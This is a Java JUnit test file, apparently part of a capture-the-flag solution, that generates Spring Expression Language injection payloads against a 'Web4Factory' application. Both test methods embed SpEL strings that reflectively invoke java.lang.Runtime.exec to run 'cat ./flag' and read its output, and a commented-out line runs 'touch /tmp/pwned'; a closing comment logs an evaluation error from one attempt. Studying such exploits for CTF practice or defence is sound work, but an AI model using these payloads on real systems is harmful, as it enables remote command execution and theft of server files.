package institute.nautilus.web4factory;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import org.junit.jupiter.api.Test;
import org.springframework.boot.test.context.SpringBootTest;

import institute.nautilus.web4factory.web4factoryfactory.Web4FactoryFactory;
import institute.nautilus.web4factory.web4factoryfactory.Web4FactoryFactoryWidget;
import institute.nautilus.web4factory.web4factoryfactory.Web4FactoryFactoryAwkWidget;
import institute.nautilus.web4factory.Web4FactoryExpression;

import java.io.*;
import java.lang.*;

@SpringBootTest
public class ApplicationContextTest {
    static Logger logger = LoggerFactory.getLogger(Web4Connection.class);

    @Test
    public void generateSPELExploit() {

        Web4FactoryFactoryWidget w = new Web4FactoryFactoryWidget("");
        //w.name = "''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('touch /tmp/pwned')+";
        w.name = "new java.io.BufferedReader(T(java.io.Reader).cast(new java.io.InputStreamReader(T(java.io.InputStream).cast(''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('cat ./flag').getInputStream())))).readLine()+";
        w.argTypes = new Class[]{String.class};
        w.returnType = String.class;
        Web4FactoryFactory f = new Web4FactoryFactory("test",w);
        String out = f.toString();

        logger.info("SPELExploit object is {}", out);

    }

    @Test
    public void generateSPELExploit2() throws IOException {
        Web4FactoryFactory f = new Web4FactoryFactory("foo", null);
        f.factoryExpr = new Web4FactoryExpression("new java.io.BufferedReader(T(java.io.Reader).cast(new java.io.InputStreamReader(T(java.io.InputStream).cast(''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('cat ./flag').getInputStream())))).readLine()", String.class);
        String out = f.s(f);
        logger.info("SPELExploit2 object is {}", out);
    }
    /*
org.springframework.expression.spel.SpelEvaluationException: EL1003E: A problem occurred whilst attempting to construct an object of type 'InputStreamReader' using arguments '(java.lang.ProcessImpl$ProcessPipeInputStream)'
*/

}
